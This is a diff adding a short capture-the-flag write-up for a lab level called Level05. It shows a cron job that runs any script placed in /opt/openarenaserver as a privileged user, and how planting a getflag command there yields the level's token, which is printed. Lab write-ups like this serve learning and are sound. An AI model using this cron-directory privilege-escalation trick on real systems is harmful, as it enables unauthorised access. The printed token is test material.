@@ -1,0 +1,35 @@
+# When I logged in to Level05, I received a message: "You have a new mail". So I "find" it:
+
+$> find / -name "mail" 2>/dev/null
+
+/usr/lib/byobu/mail
+/var/mail
+/var/spool/mail
+/rofs/usr/lib/byobu/mail
+/rofs/var/mail
+/rofs/var/spool/mail
+
+
+$> cat /var/mail/level05
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+# This is a cron job. It says it will run "sh /usr/sbin/openarenaserver" every 2 minutes. Let see what it is doing:
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+# For each file in /opt/openarenaserver/ it will execute the command it contains and then delete it.
+
+$> echo "getflag > /tmp/flag" > opt/openarenaserver/soluce
+
+# Wait 2 min.
+
+$> cat /tmp/flag
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
